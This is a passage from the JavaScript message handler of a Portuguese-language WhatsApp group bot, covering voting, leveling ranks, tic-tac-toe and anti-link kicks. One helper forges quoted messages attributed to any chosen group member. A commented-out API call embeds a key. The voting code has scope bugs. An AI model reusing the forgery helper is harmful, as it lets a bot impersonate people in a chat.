loli.sendMessage(from, tej, text, {quoted:mek})
}
if (antibot === true) return
const catalogo = (teks) => {
 res = loli.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "*_©zadik_*", "thumbnail": img2, "surface": 'CATALOG'}}, {quoted: mek})
 loli.relayWAMessage(res)
}

/*
const enviar = (teks) => {
loli.sendMessage(from, teks, text,  {quoted: mek, contextInfo: {"mentionedJid": [sender], forwardingScore: 1000, isForwarded: true }})
}*/

/********** SENDMESS DO BC **********/
const sendMess = (hehe, teks) => {
loli.sendMessage(hehe, teks, text)
}
const sendImage = (tis) => {
loli.sendMessage(from, tis, image, {quoted:mek})
}
const replyS = async(stik) => {
await loli.sendMessage(from, stik, sticker, {quoted: say1})
}
const mentions = (ops, memberr, sender, id) => {
(id == null || id == undefined || id == false) ? loli.sendMessage(from, ops.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : loli.sendMessage(from, ops.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
}
const costum = (pesan, tipe, target, target2) => {
 loli.sendMessage(from, pesan, tipe, {quoted: {key: {fromMe: false, participant: `${target}`, ...(from ? {remoteJid: from}: {})}, message: {conversation: `${target2}` }}})
}
 const sendPtt = (teks) => {
 loli.sendMessage(from, audio, mp3, {quoted: mek})
}
const getGroup = async function(totalchat){
	let grup = []
	let a = []
	let b = []
	for (c of totalchat){
		a.push(c.jid)
	}
	for (d of a){
		if (d && d.includes('g.us')){
			b.push(d)
		}
	}
	for (e of b){
		let ingfo = await loli.groupMetadata(e)
		grup.push(ingfo)
	}
	return grup
}

mess = {
wait: '𝘼𝙜𝙪𝙖𝙧𝙙𝙚 𝙤𝙣𝙞𝙞-𝙘𝙝𝙖𝙣😘',
levelnoton: 'TESTE TESTE',
levelnol: 'TESTE TESTE',
error: {
stick: '[❗] Falha, ocorreu um erro ao converter a imagem em um adesivo ❌',
Iv: '❌ Link inválido ❌',
limit: `Opa desculpa onii-chan seu limite acabou`,
only: {
tobiowber: `Esse comando só pode ser usado por ${SeuNome}`,
tobiplays: `⏳Comando ${command} aguarde alguns instantes...⏳\n\nA sua música será enviada em até 2 minutos\nCaso não envie, tente especificar o nome da música.`,
tobiattp: 'Aguarde nii-san😊\n\nCaso não funcione, use o comando novamente.️',
tobianime: `Ohayo Oni-chan, Comando ${command} Vai demorar alguns segundos...`,
tobirply: `[❗] Comando ${command} ja esta ativado!`,
group: '[❗] Este comando só pode ser usado em grupos! ❌',
player: `Desculpe onii-chan parece que você não é um aventureiro!!\nPara ser um aventureiro digite :\n${prefix}joinrpg`,
					premium: `[❗] ESTE PEDIDO É SO PARA *USUÁRIOS VIP*`,
					mod: `[❗] ESTE PEDIDO É ESPECÍFICO PARA USUARIO MOD HORI BOT*`,
					benned: `Você para a banda, por favor, contate o proprietário para abrir sua banda`,
					ownerG: `[❗] Proprietário? Este é um recurso especial para o proprietário do bot ❌`,
					ownerB: `[❗] Proprietário? Este é um recurso especial para o proprietário do bot ❌`,
					userB: `──「 LISTA 」──\nOlá Kak !\nDesculpe, irmã. Você não está registrado como amigo de Hori. Registre-se para fazer amizade com a bot Hori`,
					admin: `[❗] Este comando só pode ser usado por administradores de grupo! ❌`,
					Badmin: `[❗] Este comando só pode ser usado quando o bot se torna administrador! ❌`,
tobireplayoff: `[❌] Comando ${command} desativado com sucesso!`,
tobireplay: `[❗] Comando ${command} ativado com sucesso!`,
tobantilink: `Eae onii-chan, E esse link aí?🧐`,
            tobizinhoB: `
╭⊷╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾⊷╾
┃⋆╭╾╾╾⟨ 🍥 REGISTRE-SE 🍥 ⟩
┃⋆│❍ Olá corno(a)!
┃⋆│❍ Você não está registrado no bot
┃⋆│
┃⋆│❍ Use: ${prefix}registrar Nome|idade
┃⋆│❍ Exemplo : ${prefix}registrar ${SeuNome}|18
┃⋆│
┃⋆│❍ Ou ${prefix}registrar ${pushname}|18
┃⋆│
┃⋆│❍ Usa seu nome, ou nick
┃⋆│❍ Sua idade real, ou fake
┃⋆│
┃⋆│❍ Caso queira ajuda:
┃⋆│❍ http://Wa.me/${SeuNumero}
┃⋆╰─────────────────
╚⊷╾╾╾╾╾⊷╾╾╾╾╾⊷╾╾╾⊷⊷`,
}
}
}
 function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}
 function monospace(string) {
            return '```' + string + '```'
        }

//_VOTAÇÃO BY TRASH/RESEN/ITALU/TOBI
/*let posTest2 = false
      Object.keys(votou).forEach((i) => {
          if (votou[i].grupo === from) {
              posTest2 = i
          }
      })
      if (posTest2 === false) {
      voto2 = {grupo: from, votos: [sender]}
      votou.push(voto2)
      } else {
      votou[posTest2].votos.push(sender)
      }*/

const isVotacao = () => {
   let position = false
   Object.keys(votacao).forEach((i) => {
   if (votacao[i].grupo === from) {
      position = i
   }
   })
   if (position !== false) {
      return true
   } else {
      return false
   }
}

const ja_votou = () => {
    let position = false
   Object.keys(votou).forEach((i) => {
   if (votou[i].votos.includes(sender) && votou[i].grupo === from) {
      position = i
   }
   })
   if (position !== false) {
      return true
   } else {
      return false
   }
}

if (isVotacao()) {
   if (messagesC.includes("sim")) {
      if (ja_votou())return reply('Voce ja votou, espere um admin parar esta votação')
   
      reply('Voto adicionado')
      let posTest = false
      Object.keys(votou).forEach((i) => {
          if (votou[i].grupo === from) {
              posTest = i
          }
      })
      if (posTest === false) {
      voto = {grupo: from, votos: [sender]}
      votou.push(voto)
      } else {
      votou[posTest].votos.push(sender)
      }
      fs.writeFileSync('./arquivos_json/votou.json', JSON.stringify(votou, null, '\t'))
      let position = false
   Object.keys(votacao).forEach((i) => {
   if (votacao[i].grupo === from) {
      position = i
   }
   })
   if (position !== false) {
      votacao[position].sim += 1
      fs.writeFileSync('./arquivos_json/votacao.json', JSON.stringify(votacao, null, '\t'))
      trash_a = String(votacao[position].sim)
      trash_b = String(votacao[position].nao)
      reply(`Total de votos\n\nSim: ${trash_a}\nNao: ${trash_b}`)
   }
 }
    if (messagesC.includes("nao")) {
      if (ja_votou())return reply('Voce ja votou, espere um admin parar esta votação')
      reply('Voto adicionado')
       let posTest2 = false
      Object.keys(votou).forEach((i) => {
          if (votou[i].grupo === from) {
              posTest2 = i
          }
      })
      if (posTest === false) {
      voto2 = {grupo: from, votos: [sender]}
      votou.push(voto2)
      } else {
      votou[posTest2].votos.push(sender)
      }
      fs.writeFileSync('./arquivos_json/votou.json', JSON.stringify(votou, null, '\t'))
      let position = false
   Object.keys(votacao).forEach((i) => {
   if (votacao[i].grupo === from) {
      position = i
   }
   })
   if (position !== false) {
      votacao[position].nao += 1
      fs.writeFileSync('./arquivos_json/votacao.json', JSON.stringify(votacao, null, '\t'))
      trash_a = String(votacao[position].sim)
      trash_b = String(votacao[position].nao)
      reply(`Total de votos\n\nSim: ${trash_a}\nNao: ${trash_b}`)
   }
 }
}
//_FINAL DA CASE "VOTAÇÃO" 

   const levelRole = getLevelingLevel(sender)
   	     var role = 'bronze'
   	     if (levelRole <= 3) {
   	         role = 'Cobre'
   	     } else if (levelRole <= 5) {
   	         role = 'Ferro'
   	     } else if (levelRole <= 7) {
   	         role = 'Prata'
   	     } else if (levelRole <= 10) {
   	         role = 'Ouro'
   	     } else if (levelRole <= 12) {
   	         role = 'Platina'
   	     } else if (levelRole <= 15) {
   	         role = 'Mithril'
   	     } else if (levelRole <= 18) {
   	         role = 'Oricalco'
   	     } else if (levelRole <= 25) {
   	         role = 'Adamante'
   	     }

//_FUCTION PATENTE
  const nivelAtual = getLevelingLevel(sender)
            var patt = 'Bronze I🥉'
            if (nivelAtual <= 1) {
                patt = 'Bronze  I🥉'
            } else if (nivelAtual <= 2) {
                patt = 'Bronze II🥉'
            } else if (nivelAtual <= 3) {
                patt = 'Bronze  III🥉'
            } else if (nivelAtual <= 4) {
                patt = 'Bronze  IV🥉'
            } else if (nivelAtual <= 5) {
                patt = 'Bronze  V🥉'
            } else if (nivelAtual <= 6) {
                patt = 'Prata I🥈'
            } else if (nivelAtual <= 7) {
                patt = 'Prata II🥈'
            } else if (nivelAtual <= 8) {
                patt = 'Prata III🥈'
            } else if (nivelAtual <= 9) {
                patt = 'Prata IV🥈'
            } else if (nivelAtual <= 10) {
                patt = 'Prata V🥈'
            } else if (nivelAtual <= 11) {
                patt = 'Ouro I🥇'
            } else if (nivelAtual <= 12) {
                patt = 'Ouro II🥇'
            } else if (nivelAtual <= 13) {
                patt = 'Ouro III🥇'
            } else if (nivelAtual <= 14) {
                patt = 'Ouro IV🥇'
            } else if (nivelAtual <= 15) {
                patt = 'Ouro V🥇'
            } else if (nivelAtual <= 16) {
                patt = 'Campeão I🏆'
            } else if (nivelAtual <= 17) {
                patt = 'Campeão II🏆'
            } else if (nivelAtual <= 18) {
                patt = 'Campeão III🏆'
            } else if (nivelAtual <= 19) {
                patt = 'Campeão IV🏆'
            } else if (nivelAtual <= 20) {
                patt = 'Campeão V🏆'
            } else if (nivelAtual <= 21) {
                patt = 'Diamante I 💎'
            } else if (nivelAtual <= 22) {
                patt = 'Diamante II 💎'
            } else if (nivelAtual <= 23) {
                patt = 'Diamante III 💎'
            } else if (nivelAtual <= 24) {
                patt = 'Diamante IV 💎'
            } else if (nivelAtual <= 25) {
                patt = 'Diamante V 💎'
            } else if (nivelAtual <= 26) {
                patt = 'Mestre I 🐂'
            } else if (nivelAtual <= 27) {
                patt = 'Mestre II 🐂'
            } else if (nivelAtual <= 28) {
                patt = 'Mestre III 🐂'
            } else if (nivelAtual <= 29) {
                patt = 'Mestre IV 🐂'
            } else if (nivelAtual <= 30) {
                patt = 'Mestre V 🐂'
            } else if (nivelAtual <= 31) {
                patt = 'Mítico I 🔮'
            } else if (nivelAtual <= 32) {
                patt = 'Mítico II 🔮'
            } else if (nivelAtual <= 33) {
                patt = 'Mítico III 🔮'
            } else if (nivelAtual <= 34) {
                patt = 'Mítico IV 🔮'
            } else if (nivelAtual <= 35) {
                patt = 'Mítico V 🔮'
            } else if (nivelAtual <= 36) {
                patt = 'God I🕴'
            } else if (nivelAtual <= 37) {
                patt = 'God II🕴'
            } else if (nivelAtual <= 38) {
                patt = 'God III🕴'
            } else if (nivelAtual <= 39) {
                patt = 'God IV🕴'
            } else if (nivelAtual <= 40) {
                patt = 'God V🕴'
            } else if (nivelAtual <= 41) {
                patt = 'Grande Mestre I 🛐'
            } else if (nivelAtual <= 42) {
                patt = 'Grande Mestre II 🛐'
            } else if (nivelAtual <= 43) {   	
                patt = 'Grande Mestre III 🛐'
            } else if (nivelAtual <= 44) {
                patt = 'Grande Mestre IV 🛐'
            } else if (nivelAtual <= 100) {
			       patt = 'Elite🛡'
		     } else if (nivelAtual <= 200) {
			      patt = 'Global🌍'
		     } else if (nivelAtual <= 300) {
			patt = 'Herói⚔'
		     } else if (nivelAtual <= 500) {
			patt = 'Lendário🏯'
		     } else if (nivelAtual <= 600) {
			patt = 'Semi-Deus👼'
		    } else if (nivelAtual <= 700) {
			patt = 'Arcanjo😇'
		   } else if (nivelAtual <= 800) {
			patt = 'Demoníaco👹'
		   } else if (nivelAtual <= 900) {
			patt = 'Deus-Sama🧙‍♂️'
			} else if (nivelAtual <= 1000) {
			patt = 'Divindade 🤴'
           } else if (nivelAtual >= 2000 || nivelAtual >= 2000) {
                patt = 'Divindade Suprema  👤👁'
           } 
            
//PORCENTAGEM DA BATERIA
var porcentagem = '*[▒▒▒▒▒▒▒▒▒▒] 0%*'  
const bateria = (`${baterai}`)
if (bateria <= 10) {
porcentagem = `*[█▒▒▒▒▒▒▒▒▒] ${bateria}%*`
} else if (bateria <= 20) {
porcentagem = `*[██▒▒▒▒▒▒▒▒] ${bateria}%*`
} else if (bateria <= 30) {
porcentagem = `*[███▒▒▒▒▒▒▒] ${bateria}%*`
} else if (bateria <= 40) {
porcentagem = `*[████▒▒▒▒▒▒] ${bateria}%*`
} else if (bateria <= 50) {
porcentagem = `*[█████▒▒▒▒▒] ${bateria}%*`
} else if (bateria <= 60) {
porcentagem = `*[██████▒▒▒▒] ${bateria}%*`
} else if (bateria <= 70) {
porcentagem = `*[███████▒▒▒] ${bateria}%*`
} else if (bateria <= 80) {
porcentagem = `*[████████▒▒] ${bateria}%*`
} else if (bateria <= 90) {
porcentagem = `*[█████████▒] ${bateria}%*`
} else if (bateria <= 100) {
porcentagem = `*[██████████] ${bateria}%*`
} 			

/*--------------------[ Tictactoe jogo Function ]--------------------*/
const cmde = budy.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
     if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
          const boardnow = setGame(`${from}`);
          if (budy == "Cex") return reply("why");
          if (
               budy.toLowerCase() == "s" ||
               budy.toLowerCase() == "sim" ||
               budy.toLowerCase() == "ok"
          ) {
               if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
                    if (boardnow.status)
                         return reply(`O jogo já começou antes!`);
                    const matrix = boardnow._matrix;
                    boardnow.status = true;
                    fs.writeFileSync(
                         `./lib/tictactoe/db/${from}.json`,
                         JSON.stringify(boardnow, null, 2)
                    );
                    const chatAccept = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
                    
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
               
Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

     ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
     ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
     ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}

`;
                    loli.sendMessage(from, chatAccept, MessageType.text, {
                         quoted: mek,
                         contextInfo: {
                              mentionedJid: [
                                   boardnow.X + "@s.whatsapp.net",
                                   boardnow.O + "@s.whatsapp.net",
                              ],
                         },
                    });
               } else {
                    loli.sendMessage(
                         from,
                         `『❗』 Esta e uma opção apenas para o @${boardnow.O} !`,
                         MessageType.text, {
                         quoted: mek,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               }
          } else if (
               budy.toLowerCase() == "n" ||
               budy.toLowerCase() == "não" ||
               budy.toLowerCase() == "no"
          ) {
               if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
                    if (boardnow.status)
                         return reply(`O jogo já começou!`);
                    fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
                    loli.sendMessage(
                         from,
                         `@${boardnow.X} *_Infelizmente seu oponente não aceito o desafio ❌😕_*`,
                         MessageType.text, {
                         quoted: mek,
                         contextInfo: {
                              mentionedJid: [boardnow.X + "@s.whatsapp.net"],
                         },
                    }
                    );
               } else {
                    loli.sendMessage(
                         from,
                         `『❗』 Esta e uma opção apenas para o @${boardnow.O} !`,
                         MessageType.text, {
                         quoted: mek,
                         contextInfo: {
                              mentionedJid: [boardnow.O + "@s.whatsapp.net"],
                         },
                    }
                    );
               }
          }
     }

     if (arrNum.includes(cmde)) {
          const boardnow = setGame(`${from}`);
          if (!boardnow.status) return reply(`Parece que seu oponente não aceitou o desafio ainda...`)
          if (
               (boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
               sender.replace("@s.whatsapp.net", "")
          )
               return;
          const moving = validmove(Number(budy), `${from}`);
          const matrix = moving._matrix;
          if (moving.isWin) {
               if (moving.winner == "SERI") {
                    const chatEqual = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
          
Jogo termina empatado 😐
`;
                    reply(chatEqual);
                    fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
                    return;
               }
               const dinherowin = Math.ceil(Math.random() * 5000)
               const winnerJID = moving.winner == "O" ? moving.O : moving.X;
               const looseJID = moving.winner == "O" ? moving.X : moving.O;
               const limWin = Math.floor(Math.random() * 20) + 10;
               const limLoose = Math.floor(Math.random() * 10) + 5;
               const chatWon = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
          
Vencido por @${winnerJID} 😎👑
`;
            //    giftLimit(winnerJID + "@s.whatsapp.net", limWin);
            //    pushLimit(looseJID + "@s.whatsapp.net", limLoose);
            addKoinUser(winnerJID + "@s.whatsapp.net", dinherowin)           
               loli.sendMessage(from, chatWon, MessageType.text, {
                    quoted: mek,
                    contextInfo: {
                         mentionedJid: [
                              moving.winner == "O" ?
                                   moving.O + "@s.whatsapp.net" :
                                   moving.X + "@s.whatsapp.net",
                         ],
                    },
               });
setTimeout( () => {
if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
 fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
 reply(`*🕹️JOGO DA VELHA RESETADO...🕹️*`);
 } else {
console.log(color(time, "red"), color("[ ESPIRADO ]", "magenta"), color('Jogo da velha espirado', "red"));
 }
}, 50000) //5 minutos
                reply(`_*🥳Parabéns @${winnerJID} Você ganhou +${dinherowin} de dinheiro por ter ganhado o jogo da velha🎉...*_`)      
               fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
          } else {
               const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
          
❌ : @${moving.X}
⭕ : @${moving.O}

Sua vez : @${moving.turn == "X" ? moving.X : moving.O}


     ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
     ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
     ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


`;
               loli.sendMessage(from, chatMove, MessageType.text, {
                    quoted: mek,
                    contextInfo: {
                         mentionedJid: [
                              moving.X + "@s.whatsapp.net",
                              moving.O + "@s.whatsapp.net",
                         ],
                    },
               });
          }
     }

//_TIPO DE USUÁRIO
if (groupAdmins) {
prema = '𝘼𝙙𝙚𝙢𝙞𝙧😎'
}
if (isvipp) {
prema = '𝙑𝙄𝙋 🤑'
}
if (isOwner) {
prema = '𝙊 𝙘𝙧𝙞𝙖𝙙𝙤𝙧 👤'
} else {
var prema = '𝙈𝙚𝙢𝙗𝙧𝙤 𝙧𝙚𝙜𝙞𝙨𝙩𝙧𝙖𝙙𝙤😌'
}
 var elit = 'Aventureiro Comum'
			if (isvipp) {
				elit = 'Profissional de Aventureiro'
			} 
			if (isOwner) {
				elit = 'Mestre do jogo'
			}
//_XP COM LEVELING ATIVO
if (isGroup && isLevelingOn) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
const amountXp = Math.floor(Math.random() * (3 - 5 + 10) + 3)
const requiredXp = 20 * Math.pow(currentLevel, 2) + 150 * currentLevel + 1000
const getLevel = getLevelingLevel(sender)
const namelv = checkId
mett = ["1", "2", "3", "4", "5", "6"]
res = mett[Math.floor(Math.random() * mett.length)]
result = fs.readFileSync(`./src/som` + res + `.mp3`)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m LEVEL UP \x1b[1;37m]', color(pushname, "yellow"), color('subiu de level', 'yellow'), color('no grupo:', "yellow"), color(groupName, 'yellow'), color('horas', "yellow"), color(hr, "yellow"))
/*const leveltab = (pushname, userLevel, userXp, patt) => {
const requiredXp = 5 * Math.pow(userLevel) + 50 * userLevel + 100
const requiredXp1 = 5 * Math.pow(userLevel, (5 / 2)) + 50 * userLevel + 100
var requiredXp2 = 5 * Math.pow((userLevel - 1), (5 / 2)) + 50 * (userLevel - 1) + 100
if (userLevel == 1) {
    requiredXp2 = 0
} 
const porcent = Math.round(((userXp - requiredXp2) * 100) / (requiredXp1 - requiredXp2))
const bar = [`[▒▒▒▒▒▒▒▒▒]`, `[███▒▒▒▒▒▒]`, `[████▒▒▒▒▒]`, `[██████▒▒▒]`, `[████████▒]`, `[█████████]`]
var hagzbahzbzh = ``
if (porcent < 20) {
    hagzbahzbzh = bar[0]
} else if (porcent > 20 && porcent < 40) {
    hagzbahzbzh = bar[1]
} else if (porcent > 40 && porcent < 60) {
    hagzbahzbzh = bar[2]
} else if (porcent > 60 && porcent < 80) {
    hagzbahzbzh = bar[3]
} else if (porcent > 80 && porcent < 100) {
    hagzbahzbzh = bar[4]
} else {
    hagzbahzbzh = bar[5]
}
}*/
const lvup = {
text:
`
⊷════❖「 Subiu de nível 」❖════⊷
╭━═══════════════⊷
┃╭══════════════⊷
┃│         ⬩Ｌｅｖｅｌ 
┃│⪧ Nome: ${pushname}
┃│⪧ Número: @${namelv.split('@')[0]}
┃│⪧ XP: ${getLevelingXp(sender)}
┃│⪧ Level: ${getLevel} -> ${getLevelingLevel(sender)}
┃│⪧ Patente: ${patt}
┃╰═════════════⊷
╰━═══════════════⊷`,
contextInfo: {mentionedJid: [namelv]}}
loli.sendMessage(from, result, audio, {mimetype: 'audio/mp4', ptt: true}).then((response) => {
setTimeout(() => {loli.deleteMessage(from, {id: response.key.id, remoteJid: from, fromMe: true})}, 3600000)
})
loli.sendMessage(from, lvup, text, {quoted: mek}).then((response) => {
setTimeout(() => {loli.deleteMessage(from, {id: response.key.id, remoteJid: from, fromMe: true})}, 3600000)
})
//loli.sendMessage(from, lvup, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}}
}
} catch (err) {
console.error(err)
}

/*
╭◪
╰───────────────╮  
╭───────────────╯
├❏🔋 : ${baterai}
├➥ Bateria do bot 
├❏ 📊 : ${porcentagem}
├➥ Porcentagem do bot
╰───────────────╯`

  ╭╼╾╼╾╼╾╼╾╼╾╼╾╼
  │‣ Nome: @${namelv.split('@')[0]}
  ├╼╾╼╾╼╾╼╾╼╾╼╾╼
  │‣ XP: ${getLevelingXp(sender)}
  ├╼╾╼╾╼╾╼╾╼╾╼╾╼
  │‣ Level: ${getLevel} -> ${getLevelingLevel(sender)}
  ├╼╾╼╾╼╾╼╾╼╾╼╾╼
  │‣ Patente: ${patt}
  ╰╼╾╼╾╼╾╼╾╼╾╼╾╼
  */

/*if (isGroup && isLevelingOn) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
try {
ppimg = await loli.getProfilePicture(`${sender.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
const amountXp = Math.floor(Math.random() * (20 - 30 + 45) + 15)
const requiredXp = 20 * Math.pow(currentLevel, 2) + 150 * currentLevel + 1000
const getLevel = getLevelingLevel(sender)
const namelv = checkId
mett = ["1", "2", "3"]
res = mett[Math.floor(Math.random() * mett.length)]
result = fs.readFileSync(`./src/som` + res + `.mp3`)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
yevel = await getBuffer(`https://api.lolhuman.xyz/api/rank?apikey=genbotkey&img=${ppimg}&background=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxANrjm0j_uzUclnOAlHjtgroMtblwSPChJg&usqp=CAU&username=${encodeURI(pushname)}&level=${getLevelingLevel(sender)}&ranking=${getLevel} ~> ${getLevelingLevel(sender)}&currxp=${getLevelingXp(sender)}&xpneed=${requiredXp}`)
resul = `
════❖LEVEL UP❖════
  ➣ Nome: @${sender.split("@")[0]}
  ╭╼╾╼╾╼╾╼╾╼╾╼╾╼
  │➣ XP: ${getLevelingXp(sender)}
  │➣ Level: ${getLevel} -> ${getLevelingLevel(sender)}
  │➣ Patente: ${patt}
  ╰╼╾╼╾╼╾╼╾╼╾╼╾╼
  
════❖LEVEL UP❖════`,
loli.sendMessage(from, resul, {quoted: mek})
loli.sendMessage(from, result, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true})
loli.sendMessage(from, yevel, image, {sendEphemeral: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: mek, caption: resul})
}
} catch (err) {
console.error(err)
}*/

 

//_DINHEIRO 
if (isGroup) {
const checkATM = checkATMuser(sender)
try {
if (checkATM === undefined) addATM(sender)
const uangsaku = Math.floor(Math.random() * 10) + 90
addKoinUser(sender, uangsaku)
} catch (err) {
console.error(err)
}
}

/*if (sticker.includes(type)){
reply(`figurinha detectada 👍🏻`)
}*/
	
// ANTILINKS, PIX TED, WHATSAPP....
if(isUrl(budy) && isAntiLink && isGroupAdmins && isBotGroupAdmins && !mek.key.fromMe) {
const linkAS = await loli.groupInviteCode(`${from}`)
if (budy.match(linkAS)) return reply('Link do Grupo, não irei remover ainda..')  
reply('*Link detectado, porém onni-chan é ADMIN*')
}
if(isUrl(budy) && isAntiLink && !isGroupAdmins && isBotGroupAdmins && !mek.key.fromMe) {
reply('*Link detectado, DELETANDO HUMANO DO MUNDO...*')
kic = `${sender.split("@")[0]}@s.whatsapp.net`
loli.groupRemove(from, [kic])
}

if (budy.includes("https")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("://chat.whatsapp.com/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("://instagram.com/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("https://")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("Https://")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("http:/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("https:/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("https://t.me/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("https://onlyfans.com")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("onlyfans.com")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("youtube.com/watch?")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("https://wa.me/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("*TED ou PIX*")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("https://vm.tiktok.com/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}
if (budy.includes("https://s.kwai.app/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("chat.whatsapp.com/")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("://youtube.com/channel")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("venda cp")){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return reply(mess.only.tobantilink)
kic = `${sender.split("@")[0]}@s.whatsapp.net`
				loli.groupRemove(from, [kic])
			}

if (budy.includes("chilldren porn")){
if (!isGroup) return
if (!isAntiLink) return
